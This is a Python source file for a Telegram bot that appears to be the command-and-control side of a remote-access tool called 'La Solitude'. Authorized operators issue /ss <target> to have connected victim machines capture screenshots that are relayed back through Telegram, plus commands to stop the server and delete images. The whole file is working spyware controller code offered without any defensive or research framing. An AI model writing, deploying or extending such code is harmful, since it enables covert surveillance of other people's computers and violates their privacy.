from telegram.ext import Application, CommandHandler
import signal
import sys
import threading
from server import Server
import os
import argparse

IMG_FOLDER = "./img"
image_count = 0
AUTHORIZED_USERS = []
server = Server()

def check_auth(update):
    global AUTHORIZED_USERS
    if not update.effective_user.id in AUTHORIZED_USERS:
        update.message.reply_text("Unauthorized access!")
        return False
    return True

def authenticate():
    global AUTHORIZED_USERS
    
    with open("user_ids.txt", "r") as f:
        AUTHORIZED_USERS = [int(line.strip()) for line in f.readlines()]

async def ss(update, context):
    global image_count

    if not check_auth(update):
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /ss <target>")
        return

    target = context.args[0]

    if target not in server.target_socket_db:
        await update.message.reply_text(f"Target {target} unknown or not connected!")
        return
    
    # Client is connected we can send the command

    server.send_command("1", target) # 1 is the command to take a screenshot
    feedback = server.receive_image(image_count + 1, target)
    if not feedback:
        await update.message.reply_text("Failed to receive the screenshot!")
        return
    image_count += 1
    image = f"img/{image_count}.png"
    await update.message.reply_text(f"Screenshot from {target}")
    await update.message.reply_photo(open(f"{image}", "rb"))

async def stop(update, context):
    if not check_auth(update):
        return
    
    server.shut_down()

    await update.message.reply_text("Stopped!")
    os.kill(os.getpid(), signal.SIGINT)

async def delete_images(update, context):
    global image_count

    if not check_auth(update):
        return

    images = os.listdir(IMG_FOLDER)
    for image in images:
        os.remove(f"{IMG_FOLDER}/{image}")
    image_count = 0

def handle_sigint(sig, frame):
    print("[!] SIGINT Received...", flush=True)
    os.kill(os.getpid(), signal.SIGINT)

async def help(update, context):
    if not check_auth(update):
        return
    await update.message.reply_text("Privet, menya zovut Dostoyevskiy.\n\n/ss <target> - Take a screenshot of the target\n/stop - Stop the server\n/delete - Delete all images\n/help - Show this message")

def main(ip, port):
    global server
    server.set(ip, port)
    try:
        authenticate()
    except FileNotFoundError:
        print("[!] user_ids.txt not found!", flush=True)
        sys.exit(1)

    # Create the image folder if it doesn't exist
    if not os.path.exists(IMG_FOLDER):
        os.makedirs(IMG_FOLDER)
    else :
        images = os.listdir(IMG_FOLDER)
        for image in images:
            os.remove(f"{IMG_FOLDER}/{image}")

    # Handle the initial launch
    try:
        with open("token.txt", "r") as f:
            token = f.read().strip()
    except FileNotFoundError:
        print("[!] token.txt not found!", flush=True)
        sys.exit(1)

    serverThread = threading.Thread(target=server.start)
    serverThread.daemon = True
    serverThread.start()

    application = Application.builder().token(token).concurrent_updates(True).read_timeout(30).write_timeout(30).build()
    application.add_handler(CommandHandler("ss", ss))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("delete", delete_images))
    application.add_handler(CommandHandler("help", help))

    signal.signal(signal.SIGINT, handle_sigint)

    print("[+] La Solitude started!", flush=True)
    application.run_polling()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Encrypt or decrypt IP and port.")
    parser.add_argument("ip", type=str, help="IP address of the server")
    parser.add_argument("port", type=int, help="Port of the server")

    args = parser.parse_args()

    main(args.ip, args.port)